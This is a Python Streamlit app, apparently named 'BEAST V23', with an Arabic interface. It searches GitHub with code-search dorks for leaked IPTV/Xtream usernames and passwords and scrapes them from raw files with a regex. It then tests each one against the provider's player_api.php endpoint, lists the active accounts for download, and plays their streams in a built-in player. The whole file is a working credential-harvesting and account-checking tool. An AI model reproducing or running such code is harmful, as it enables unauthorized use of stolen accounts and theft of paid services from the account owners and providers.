import streamlit as st
import requests
import re
import time
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed

st.set_page_config(page_title="BEAST V23 - PLAYER + CHANNELS", layout="wide")

# نظام الدخول
if "auth" not in st.session_state:
    st.session_state.auth = False

if not st.session_state.auth:
    st.markdown("<h1 style='text-align: center; color:#00ff41;'>🌪️ BEAST V23 - IPTV PLAYER</h1>", unsafe_allow_html=True)
    pwd = st.text_input("Password:", type="password")
    if st.button("دخول"):
        if pwd == "BEAST_V17_PRO":
            st.session_state.auth = True
            st.rerun()
    st.stop()

st.markdown("""
<style>
    .stApp { background-color: #000; }
    .scan-log { color: #00d4ff; font-family: monospace; font-size: 13px; margin: 0; padding: 2px; }
    .active-hit {
        background: #0d1117; border: 1px solid #00ff41;
        padding: 10px; border-radius: 5px; margin-bottom: 5px;
    }
    .text-green { color: #00ff41; font-weight: bold; }
    .text-yellow { color: #fbbf24; }
    .text-white { color: #fff; font-family: monospace; }
    .server-button {
        background-color: #1e293b;
        color: #00ff41;
        border: 1px solid #00ff41;
        border-radius: 5px;
        padding: 4px 10px;
        cursor: pointer;
        margin-left: 10px;
    }
    .player-box {
        background: #000000dd;
        border: 2px solid #00ff41;
        border-radius: 10px;
        padding: 15px;
        margin-top: 20px;
    }
</style>
""", unsafe_allow_html=True)

# sidebar
with st.sidebar:
    st.title("⚡ BEAST V23")
    token = st.text_input("GitHub Token:", type="password")
    max_workers = st.slider("الخيوط المتوازية", 5, 50, 20)
    start = st.button("🚀 ابدأ البحث")
    st.info("بعد ظهور النتائج، اضغط على أي سيرفر لعرض القنوات وتشغيلها")

# منطقة الرادار
st.subheader("📡 الرادار المباشر")
radar_area = st.empty()

# منطقة النتائج
st.subheader("🏆 السيرفرات الشغالة (Hits)")
hits_area = st.container()

# منطقة المشغل (سيتم ملؤها لاحقاً)
st.subheader("🎬 مشغل القنوات")
player_area = st.empty()

# متغيرات الجلسة لتخزين السيرفر المختار
if "selected_server" not in st.session_state:
    st.session_state.selected_server = None
if "channels_data" not in st.session_state:
    st.session_state.channels_data = None

# دوال مساعدة لجلب القنوات
def fetch_categories(host, user, pw):
    try:
        url = f"{host}/player_api.php?username={user}&password={pw}&action=get_vod_categories"
        r = requests.get(url, timeout=5)
        if r.status_code == 200:
            return r.json()
    except:
        pass
    return []

def fetch_streams(host, user, pw, category_id=None):
    try:
        if category_id:
            url = f"{host}/player_api.php?username={user}&password={pw}&action=get_vod_streams&category_id={category_id}"
        else:
            url = f"{host}/player_api.php?username={user}&password={pw}&action=get_vod_streams"
        r = requests.get(url, timeout=10)
        if r.status_code == 200:
            return r.json()
    except:
        pass
    return []

def display_player(host, user, pw):
    """عرض واجهة المشغل مع قنوات VOD (أفلام)"""
    st.markdown(f"### 🎥 مشغل: `{host}`")
    st.caption(f"User: `{user}` | Pass: `{pw}`")
    
    # جلب الفئات
    categories = fetch_categories(host, user, pw)
    if not categories:
        st.warning("لا توجد فئات VOD متاحة أو السيرفر لا يدعم VOD")
        return
    
    cat_options = {cat['category_title']: cat['category_id'] for cat in categories}
    selected_cat_title = st.selectbox("اختر الفئة", list(cat_options.keys()), key="cat_select")
    cat_id = cat_options[selected_cat_title]
    
    # جلب القنوات حسب الفئة
    streams = fetch_streams(host, user, pw, cat_id)
    if not streams:
        st.info("لا توجد قنوات في هذه الفئة")
        return
    
    # عرض القنوات في شبكة
    cols = st.columns(3)
    for idx, s in enumerate(streams[:30]):  # عرض أول 30 قناة
        with cols[idx % 3]:
            stream_id = s.get('stream_id')
            title = s.get('title', 'بدون عنوان')
            poster = s.get('stream_icon', '')
            stream_url = f"{host}/live/{user}/{pw}/{stream_id}.ts"
            st.image(poster, caption=title, use_container_width=True)
            if st.button(f"تشغيل {title}", key=f"play_{stream_id}"):
                # تشغيل القناة في المشغل
                player_area.markdown(f"""
                <div class="player-box">
                    <h4 style="color:#00ff41;">▶️ الآن تشغيل: {title}</h4>
                    <video width="100%" controls autoplay>
                        <source src="{stream_url}" type="video/mp4">
                        متصفحك لا يدعم تشغيل الفيديو.
                    </video>
                </div>
                """, unsafe_allow_html=True)

# بدء البحث (نفس الكود السابق لكن مع تخزين hits في session_state)
if start and token:
    headers = {'Authorization': f'token {token}', 'Accept': 'application/vnd.github.v3+json'}
    
    dorks = [
        'extension:txt "get.php?username=" "password="',
        'extension:m3u "player_api.php"',
        'extension:txt "portal.php?username="',
        'extension:php "username" "password" "server" "port"',
        'extension:json "server" "username" "password"',
        'path:.env "XTREAM"',
    ]
    
    found_count = 0
    hits_list = []  # (host, user, pw)
    
    for dork in dorks:
        page = 1
        more_pages = True
        while more_pages:
            try:
                search_url = f"https://api.github.com/search/code?q={dork}&page={page}&per_page=100"
                res = requests.get(search_url, headers=headers)
                
                # إدارة rate limit بالطريقة الذكية
                if res.status_code == 403 and 'rate limit' in res.text.lower():
                    reset_time = int(res.headers.get('x-ratelimit-reset', time.time() + 60))
                    wait_seconds = max(1, reset_time - time.time() + 2)
                    radar_area.warning(f"⏳ Rate limit! انتظار {int(wait_seconds)} ثانية...")
                    time.sleep(wait_seconds)
                    continue
                
                data = res.json()
                if "items" not in data:
                    radar_area.warning(f"⚠️ {data.get('message', 'No items')}")
                    break
                
                items = data.get("items", [])
                if not items:
                    more_pages = False
                    break
                
                radar_area.info(f"🔍 {dork[:40]}... | صفحة {page} | {len(items)} ملف")
                
                raw_urls = [item['html_url'].replace('github.com', 'raw.githubusercontent.com').replace('/blob/', '/') for item in items]
                
                def process_file(raw_url):
                    try:
                        content = requests.get(raw_url, timeout=5).text
                        matches = re.findall(r"(https?://[a-zA-Z0-9\.-]+:\d+)/[a-zA-Z\._-]+\?username=([a-zA-Z0-9\._-]+)&password=([a-zA-Z0-9\._-]+)", content)
                        return [(host, user, pw) for host, user, pw in matches]
                    except:
                        return []
                
                with ThreadPoolExecutor(max_workers=min(max_workers, len(raw_urls))) as executor:
                    future_to_url = {executor.submit(process_file, url): url for url in raw_urls}
                    for future in as_completed(future_to_url):
                        creds = future.result()
                        for host, user, pw in creds:
                            radar_area.markdown(f"<p class='scan-log'>🔄 فحص: {host}</p>", unsafe_allow_html=True)
                            try:
                                check_url = f"{host}/player_api.php?username={user}&password={pw}"
                                r = requests.get(check_url, timeout=3)
                                if r.status_code == 200:
                                    try:
                                        js = r.json()
                                        if js.get("user_info", {}).get("status") == "Active":
                                            found_count += 1
                                            hits_list.append((host, user, pw))
                                            # عرض زر بجانب كل سيرفر
                                            with hits_area:
                                                col1, col2 = st.columns([4, 1])
                                                with col1:
                                                    st.markdown(f"""
                                                    <div class="active-hit">
                                                        <span class="text-green">✅ HIT #{found_count}</span><br>
                                                        <span class="text-white">HOST: {host}</span><br>
                                                        <span class="text-yellow">USER: {user} | PASS: {pw}</span>
                                                    </div>
                                                    """, unsafe_allow_html=True)
                                                with col2:
                                                    if st.button(f"🎬 تشغيل #{found_count}", key=f"btn_{host}_{user}"):
                                                        st.session_state.selected_server = (host, user, pw)
                                                        # إعادة تحميل الصفحة لعرض المشغل
                                                        st.rerun()
                                    except:
                                        pass
                            except:
                                continue
                
                page += 1
                time.sleep(1.5)  # مهلة بين الصفحات
                
            except Exception as e:
                radar_area.error(f"خطأ: {str(e)}")
                time.sleep(5)
    
    st.success(f"✅ اكتمل البحث! إجمالي الـ HITS: {found_count}")
    if hits_list:
        st.download_button("📥 تحميل النتائج (TXT)", "\n".join([f"{h[0]}|{h[1]}|{h[2]}" for h in hits_list]), "beast_hits.txt")

# بعد انتهاء البحث أو أثناءه، إذا كان هناك سيرفر مختار نعرض المشغل
if st.session_state.selected_server:
    host, user, pw = st.session_state.selected_server
    display_player(host, user, pw)
